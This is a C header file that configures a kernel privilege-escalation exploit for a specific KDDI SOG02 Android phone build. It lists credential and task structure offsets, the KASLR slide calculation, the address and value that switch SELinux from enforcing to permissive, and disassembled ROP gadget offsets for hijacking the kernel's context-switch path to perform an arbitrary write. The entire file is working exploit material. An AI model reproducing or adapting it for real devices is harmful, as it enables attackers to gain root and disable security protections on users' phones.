#ifndef TARGET_H
#define TARGET_H

#define TARGET_MODEL "SOG02"
#define TARGET_FINGERPRINT \
  "KDDI/SOG02_jp_kdi/SOG02:12/58.2.C.3.127/058002C003012704213379541:user/release-keys"
#define TARGET_KERNEL_RELEASE "4.19.157-perf+"

#define TARGET_USER_DS 0x0000007fffffffffULL
#define TARGET_TASK_STRIDE 0xec0
#define TARGET_TASK_ADDR_LIMIT 0x40
#define TARGET_TASK_STATE 0x58
#define TARGET_TASK_REAL_CRED 0x7d8
#define TARGET_TASK_CRED 0x7e0
#define TARGET_TASK_COMM 0x7e8
#define TARGET_TASK_TASKS 0x530
#define TARGET_TASK_PID 0x630
#define TARGET_TASK_TGID 0x634
#define TARGET_TASK_GROUP_LEADER 0x670
#define TARGET_TASK_SECURITY 0xad8
#define TARGET_TASK_FAKE_SEC 0xae0
#define TARGET_TASK_CPU_CONTEXT 0xaf0
#define TARGET_TASK_FPSIMD 0xb70
#define TARGET_CRED_SECURITY 0x78
#define TARGET_QSEE_CONTEXT "u:r:vendor_hal_keymaster_qti:s0"
#define TARGET_CRED_IDS 0x04
#define TARGET_CRED_CAPS 0x30
#define TARGET_CAP_LAST_CAP 37

/*
 * Kernel image facts, taken from the vmlinux.elf extracted from the
 * 58.2.C.3.127 boot image (Linux 4.19.157-perf+, image size 0x31b6000):
 *
 *   _text                  0xffffff8008080000   (nm)
 *   selinux_state          0xffffff800b22d000   (nm)
 *   cpu_switch_to          0xffffff800808640c   (nm)
 *   __switch_to+0x138      bl cpu_switch_to
 *   __switch_to+0x13c      continuation, saved as thread.cpu_context.pc
 *   __switch_to            0xffffff80080888c0   (nm)
 *
 * arm64 KASLR relocates the whole image by a 2 MiB multiple, so the runtime
 * address of a symbol is kernel_text_va + k*2MiB + symbol offset.
 *
 * struct selinux_state starts with { bool disabled; bool enforcing;
 * bool checkreqprot; bool initialized; } for this build (SELINUX_DEVELOP=y,
 * SELINUX_DISABLE unset), so one 32-bit store of 0x01000000 clears
 * enforcing while keeping the state initialised and policycap[] intact.
 */
#define TARGET_KERNEL_TEXT_VA 0xffffff8008080000ULL
#define TARGET_SELINUX_STATE_OFF 0x31ad000ULL
#define TARGET_SELINUX_WORD 0x01000000U

/* __switch_to: return address that cpu_switch_to stores in cpu_context.pc */
#define TARGET_SWITCH_CONTINUATION_OFF 0x89fcULL

/*
 * Gadgets used by the SEC_PERMISSIVE hijack (offsets from _text,
 * disassembled from the same vmlinux):
 *
 *   0x427410: str w20, [x19]              x19 = store address
 *             ldp x20, x19, [sp, #0x10]   x20 = store value
 *             ldp x29, x30, [sp], #0x20   x29 = saved sp, x30 = next gadget
 *             ret
 *
 *   0x117228: add sp, x29, #0            sp = saved __switch_to frame
 *             ldp x20, x19, [sp, #0x10]
 *             ldp x29, x30, [sp], #0x20   __schedule fp / _text+0x9538854
 *             ret
 *
 * The second gadget replays __switch_to's own epilogue, so x0 still holds
 * the real previous task when __schedule calls finish_task_switch().
 */
#define TARGET_GADGET_STORE_OFF 0x427410ULL
#define TARGET_GADGET_SWITCH_RETURN_OFF 0x117228ULL

#endif
